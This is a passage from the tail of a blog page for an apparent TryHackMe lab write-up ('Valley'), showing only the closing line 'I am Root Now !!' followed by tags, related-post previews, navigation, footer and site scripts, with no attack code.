</pre></table></code></div></div><p>I am Root Now !!</p><blockquote class="prompt-tip"><p>If you have any questions or suggestions, please leave a comment below. Thank You !</p></blockquote></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw me-1"></i> <a href="/categories/tryhackme/">TryHackMe</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw me-1"></i> <a href="/tags/ftp/" class="post-tag no-text-decoration" >FTP</a> <a href="/tags/privesc/" class="post-tag no-text-decoration" >PrivEsc</a> <a href="/tags/upx/" class="post-tag no-text-decoration" >UPX</a> <a href="/tags/pcapng/" class="post-tag no-text-decoration" >pcapng</a> <a href="/tags/python/" class="post-tag no-text-decoration" >python</a></div><div class=" post-tail-bottom d-flex justify-content-between align-items-center mt-5 pb-2 " ><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper d-flex align-items-center"> <span class="share-label text-muted">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Valley%20-%20StrongShiv8&url=https%3A%2F%2Fstrongshiv8.github.io%2Fposts%2FValley%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Twitter" aria-label="Twitter"> <i class="fa-fw fa-brands fa-square-x-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Valley%20-%20StrongShiv8&u=https%3A%2F%2Fstrongshiv8.github.io%2Fposts%2FValley%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Facebook" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=https%3A%2F%2Fstrongshiv8.github.io%2Fposts%2FValley%2F&text=Valley%20-%20StrongShiv8" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Telegram" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <a href="https://www.linkedin.com/feed/?shareActive=true&shareUrl=https%3A%2F%2Fstrongshiv8.github.io%2Fposts%2FValley%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Linkedin" aria-label="Linkedin"> <i class="fa-fw fab fa-linkedin"></i> </a> <button id="copy-link" aria-label="Copy link" class="btn small" data-bs-toggle="tooltip" data-bs-placement="top" title="Copy link" data-title-succeed="Link copied successfully!" > <i class="fa-fw fas fa-link pe-none fs-6"></i> </button> </span></div></div></div></article></main><aside aria-label="Panel" id="panel-wrapper" class="col-xl-3 ps-2 text-muted"><div class="access"><section id="access-lastmod"><h2 class="panel-heading">Recently Updated</h2><ul class="content list-unstyled ps-0 pb-1 ms-1 mt-2"><li class="text-truncate lh-lg"> <a href="/posts/Billing/">Billing</a><li class="text-truncate lh-lg"> <a href="/posts/Boxing/">Boxing</a><li class="text-truncate lh-lg"> <a href="/posts/Insomnia/">Insomnia</a><li class="text-truncate lh-lg"> <a href="/posts/Sea/">Sea</a><li class="text-truncate lh-lg"> <a href="/posts/Talk/">Talk</a></ul><div> <script src="https://tryhackme.com/badge/164383"></script></div><br><div> <a href="https://app.hackthebox.com/profile/595651"> <script src="https://www.hackthebox.eu/badge/595651"></script> </a></div></section><section><h2 class="panel-heading">Trending Tags</h2><div class="d-flex flex-wrap mt-3 mb-1 me-3"> <a class="post-tag btn btn-outline-primary" href="/tags/privesc/">PrivEsc</a> <a class="post-tag btn btn-outline-primary" href="/tags/public-exploit/">Public Exploit</a> <a class="post-tag btn btn-outline-primary" href="/tags/suids/">SUIDs</a> <a class="post-tag btn btn-outline-primary" href="/tags/cms/">CMS</a> <a class="post-tag btn btn-outline-primary" href="/tags/windows/">Windows</a> <a class="post-tag btn btn-outline-primary" href="/tags/password-bruteforce/">Password Bruteforce</a> <a class="post-tag btn btn-outline-primary" href="/tags/active-directory/">Active Directory</a> <a class="post-tag btn btn-outline-primary" href="/tags/lfi/">LFI</a> <a class="post-tag btn btn-outline-primary" href="/tags/wordpress/">Wordpress</a> <a class="post-tag btn btn-outline-primary" href="/tags/recon/">Recon</a></div></section></div><div class="toc-border-cover z-3"></div><section id="toc-wrapper" class="invisible position-sticky ps-0 pe-4 pb-4"><h2 class="panel-heading ps-3 pb-2 mb-0">Contents</h2><nav id="toc"></nav></section></aside></div><div class="row"><div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 px-md-4"><aside id="related-posts" aria-labelledby="related-label"><h3 class="mb-4" id="related-label">Further Reading</h3><nav class="row row-cols-1 row-cols-md-2 row-cols-xl-3 g-4 mb-4"><article class="col"> <a href="/posts/Principle/" class="post-preview card h-100"><div class="card-body"> <time data-ts="1696876200" data-df="ll" > Oct 10, 2023 </time><h4 class="pt-0 my-2">Principle</h4><div class="text-muted"><p>Description ⤵️ This machine is *Principle* , It is from HackMyVM Platform and categorized as Medium machine . Port Scan Results ⤵️ ┌──(kali㉿kali)-[~/Downloads/HackMyVM/Principle] └─$ sudo nmap -...</p></div></div></a></article><article class="col"> <a href="/posts/Deception/" class="post-preview card h-100"><div class="card-body"> <time data-ts="1686681000" data-df="ll" > Jun 14, 2023 </time><h4 class="pt-0 my-2">Deception</h4><div class="text-muted"><p>Lets check the Victim Machines IP address ⤵️ IP : 10.0.2.40 Port Scan Results ➡️ ┌──(kali㉿kali)-[~/Downloads/Proving_Ground/Deception] └─$ sudo nmap -sC -sV -p- -T4 -oN Nmap_results.txt 10....</p></div></div></a></article><article class="col"> <a href="/posts/Moneybox/" class="post-preview card h-100"><div class="card-body"> <time data-ts="1702146600" data-df="ll" > Dec 10, 2023 </time><h4 class="pt-0 my-2">Moneybox</h4><div class="text-muted"><p>You can also find this machine on VulnHub : Moneybox Port Scan Results ⤵️ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 ┌──(kali㉿kali)-[~/Downloads...</p></div></div></a></article></nav></aside><nav class="post-navigation d-flex justify-content-between" aria-label="Post Navigation"> <a href="/posts/Observer/" class="btn btn-outline-primary" aria-label="Older" ><p>Observer</p></a> <a href="/posts/Avenger/" class="btn btn-outline-primary" aria-label="Newer" ><p>AVenger</p></a></nav><footer aria-label="Site Info" class=" d-flex flex-column justify-content-center text-muted flex-lg-row justify-content-lg-between align-items-lg-center pb-lg-3 " ><p>© <time>2025</time> <a href="https://twitter.com/StrongShiv8">Shivendra Prajapati</a>. <span data-bs-toggle="tooltip" data-bs-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author." >Some rights reserved.</span></p><p>Using the <a data-bs-toggle="tooltip" data-bs-placement="top" title="v7.3.0" href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener" >Chirpy</a> theme for <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a>.</p></footer></div></div><div id="search-result-wrapper" class="d-flex justify-content-center d-none"><div class="col-11 content"><div id="search-hints"><section><h2 class="panel-heading">Trending Tags</h2><div class="d-flex flex-wrap mt-3 mb-1 me-3"> <a class="post-tag btn btn-outline-primary" href="/tags/privesc/">PrivEsc</a> <a class="post-tag btn btn-outline-primary" href="/tags/public-exploit/">Public Exploit</a> <a class="post-tag btn btn-outline-primary" href="/tags/suids/">SUIDs</a> <a class="post-tag btn btn-outline-primary" href="/tags/cms/">CMS</a> <a class="post-tag btn btn-outline-primary" href="/tags/windows/">Windows</a> <a class="post-tag btn btn-outline-primary" href="/tags/password-bruteforce/">Password Bruteforce</a> <a class="post-tag btn btn-outline-primary" href="/tags/active-directory/">Active Directory</a> <a class="post-tag btn btn-outline-primary" href="/tags/lfi/">LFI</a> <a class="post-tag btn btn-outline-primary" href="/tags/wordpress/">Wordpress</a> <a class="post-tag btn btn-outline-primary" href="/tags/recon/">Recon</a></div></section></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><aside aria-label="Scroll to Top"> <button id="back-to-top" type="button" class="btn btn-lg btn-box-shadow"> <i class="fas fa-angle-up"></i> </button></aside></div><div id="mask" class="d-none position-fixed w-100 h-100 z-1"></div><aside id="notification" class="toast" role="alert" aria-live="assertive" aria-atomic="true" data-bs-animation="true" data-bs-autohide="false" ><div class="toast-header"> <button type="button" class="btn-close ms-auto" data-bs-dismiss="toast" aria-label="Close" ></button></div><div class="toast-body text-center pt-0"><p class="px-2 mb-3">A new version of content is available.</p><button type="button" class="btn btn-primary" aria-label="Update"> Update </button></div></aside><script> (function () { const themeMapper = Theme.getThemeMapper('light', 'dark_dimmed'); const initTheme = themeMapper[Theme.visualState]; let lang = 'en';if (lang.length > 2 && !lang.startsWith('zh')) { lang = lang.slice(0, 2); } let giscusAttributes = { src: 'https://giscus.app/client.js', 'data-repo': 'StrongShiv8/strongshiv8.github.io', 'data-repo-id': 'R_kgDOJuXAnw', 'data-category': 'Comments', 'data-category-id': 'DIC_kwDOJuXAn84CeVpt', 'data-mapping': 'pathname', 'data-strict' : '0', 'data-reactions-enabled': '1', 'data-emit-metadata': '0', 'data-theme': initTheme, 'data-input-position': 'bottom', 'data-lang': lang, 'data-loading': 'lazy', crossorigin: 'anonymous', async: '' }; let giscusNode = document.createElement('script'); Object.entries(giscusAttributes).forEach(([key, value]) => giscusNode.setAttribute(key, value) ); const $footer = document.querySelector('footer'); $footer.insertAdjacentElement("beforebegin", giscusNode); addEventListener('message', (event) => { if (event.source === window && event.data && event.data.id === Theme.ID) { const newTheme = themeMapper[Theme.visualState]; const message = { setConfig: { theme: newTheme } }; const giscus = document.getElementsByClassName('giscus-frame')[0].contentWindow; giscus.postMessage({ giscus: message }, 'https://giscus.app'); } }); })(); </script> <script> document.addEventListener('DOMContentLoaded', () => { SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<article class="px-1 px-sm-2 px-lg-4 px-xl-0"><header><h2><a href="{url}">{title}</a></h2><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div></header><p>{snippet}</p></article>', noResultsText: '<p class="mt-5">Oops! No results found.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="me-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); }); </script>
